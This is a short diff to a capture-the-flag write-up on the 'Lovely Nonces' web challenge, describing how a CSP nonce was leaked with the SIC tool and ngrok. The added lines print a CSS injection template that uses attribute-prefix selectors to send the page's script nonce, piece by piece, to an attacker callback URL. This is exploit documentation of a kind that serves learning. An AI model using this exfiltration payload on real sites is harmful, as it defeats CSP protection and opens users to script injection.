@@ -2,7 +2,11 @@
 
 In the challenge Lovely Nonces we get the ability to inject any HTML into the page using the location hash of the website. But script execution is prevented through a random nonce via CSP.
 
-We used [SIC](https://github.com/d0nutptr/sic/) to extract the nonce from the site and [ngrok](https://ngrok.com/) to proxy the requests.
+We used [SIC](https://github.com/d0nutptr/sic/) to extract the nonce from the site and [ngrok](https://ngrok.com/) to proxy the requests. Here is the template we used for SIC
+```css
+script {display: block;}
+script[nonce^={{:token:}}] {background-image: url("{{:callback:}}");}
+```
 
 Since SIC keeps the nonces under random IDs generated per session, we modified the application to use a static ID of 1 for all requests, and then made a new endpoint to get the token.
 
